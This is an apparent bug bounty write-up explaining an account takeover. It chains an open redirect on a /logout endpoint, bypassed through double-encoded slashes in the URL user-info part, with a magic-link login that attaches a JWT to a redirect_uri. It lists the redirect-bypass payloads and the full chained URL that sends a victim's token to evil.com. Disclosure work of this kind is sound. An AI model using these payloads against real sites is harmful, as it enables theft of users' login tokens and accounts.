# Account Takeover Through Open Redirect

## How:

The program had an endpoint that was open to redirection vulnerability. By compining this vulnerability with an authentication functionality I was able to takeover the user
account.

## Open Redirection Vulnerability:

- The application had an endpoint like this <span style="color:red"> ***/logout*** </span> that takes a <span style="color:red">***GET***</span> parameter called <span style="color:red">***r***</span>.
- The parameter <span style="color:red">***r***</span> takes an endpoint to be redirected to like this <span style="color:red">***/logout?r=/dashboard***</span>.
- So I tried to to put a valid host to see what it does like this <span style="color:red">***logout?r=https://program.com/***</span>.
- The application redirected me so, I new that I can play with it to see what else I can get.
- I tried to set the host name to another domain like <span style="color:red">***r=https://evil.com/***</span> and the application responded with <span style="color:red">***invalid redirect uri***</span>.
- Knowing this I thought of listing some payloads to try out:<br>
  <span style="color:red">***r=https://evil.com/program.com***</span><br>
  <span style="color:red">***r=https://program.com.evil.com***</span><br>
  <span style="color:red">***r=https://program.com@evil.com***</span><br>
  <span style="color:red">***r=https://evil.com@program.com***</span><br>
  
- The last one was the road to success from this list. However, it's still no redirection because the application will always redirect to itself.

- So at first why we tried these payloads?
  - When I try to find an open redirection I try first to know what url format is allowed or understandable by browsers. So, the meaning of <span style="color:red">***https://john@program.com***</span> is that you are trying to access <span style="color:red">***program.com***</span> as username <span style="color:red">***john***</span>. You can try this on firefox or chrome. 
  - So, by knowing this I was thinking what if the developer is using a regex that validates this format and when someone tries to change the value of <span style="color:red">***r***</span> to <span style="color:red">***https://evil.com@program.com***</span> he validetes it as a valid value because he know that it's the samething. The user will be redirected to program.com at the end too.
  - Another question comes to my head. What is the set of characters allowed before <span style="color:red">***@***</span> I tried to test it on the browser to see what is allowed. And, I have found that the browser when I but an ecnoded value like this <span style="color:red">***john%2f***</span> as username it validtes it and sees it as a valid value. You can try it <span style="color:red">***john%2f@google.com***</span>.
  - I tried to set <span style="color:red">***r***</span> to <span style="color:red">***https://evil.com%252f@program.com/***</span> and sent the request. The response successfully redirected me to <span style="color:red">***https://evil.com/@program.com/***</span>
  - So, let's break the payload.
    - The application validates this <span style="color:red">***john@program.com***</span> as a valid format.
    - So I tried to inject <span style="color:red">***/***</span> in the payload but doubled encoded like this <span style="color:red">***https://evil.com%252f@program.com/***</span>.
    - It's double encoded because If I encoded one time it will reach the web server decoded one time.
    - The payload reaches the code at the other end like this <span style="color:red">***https://evil.com%2f@program.com/***</span>.
    - Then the response return the redirection like this <span style="color:red">***https://evil.com/@program.com***</span>.
    - As you can see the browser will treat <span style="color:red">***/@program.com***</span> as a path to <span style="color:red">***https://evil.com***</span> and the redirection successfully happenes to <span style="color:red">**evil.com**</span>.
- Another important thing is that the <span style="color:red">***/logout***</span> endpoint sends any get parameter with the new redirection like this <span style="color:red">**/logout?r=https://evil.com%252f@program.com&heap=heap**</span> the redirection will be like this <span style="color:red">**https://evil.com/@program.com/?r=https://evil.com%252f@program.com&heap=heap**</span>.


## Exploiting The Login Functionality.

- The applicaiton has a functionality to send you a magic link to login with it. This endpoint takes an <span style="color:red">***email***</span> and <span style="color:red">***redirect_uri***</span> parameters. So, after trying to find a vulnerability with the email I tried to find what I can do with the <span style="color:red">***redirect_uri***</span>.
- The <span style="color:red">***redirect_uri***</span> takes a url and the applicaion appends a <span style="color:red">**JWT**</span> token to it as a GET parameter and sends it to the user.
- So, I tried to play with the hostname of this url to try and find an open redirection but with no clue.
- But, what if can edit the path of the url like this <span style="color:red">**https://program.com/anypath/anypath**</span> I tried it and sent the request and I looked at my mail I found that the magic link is like this <span style="color:red">**https://program.com/anypath/anypath?jwt=SOME_VALUE**</span>.
- Okay great, can I compine the this with the open redirection I have found before?. I set the <span style="color:red">**redirect_uri**</span> to <span style="color:red">**https://program.com/logout?r=https://evil.com%2525%2532%2566@program.com**</span>.
- And the magic link sent was like this <span style="color:red">**https://program.com/logout?r=https://evil.com%252f@program.com&jwt=SOME_VALUE**</span>.
- Clicking the link I was redirected to <span style="color:red">**https://evil.com/?https://evil.com%252f@program.com&jwt=SOME_VALUE**</span>.
- By this, I was able to get the jwt as an attacker and using the jwt I was able to login.
- So the same scenario is done if you want to target another user. You need an email and after collecting the jwt you can use it to login to the user's account.


### My Info :

#### Yeswehack  : https://yeswehack.com/user/mekky

#### Intigriti  : https://app.intigriti.com/researcher/profile/mekky

#### Linkedin   : https://www.linkedin.com/in/muhammed-mekkawy-1504821b2/

#### Twitter    : https://twitter.com/Mekky49295157

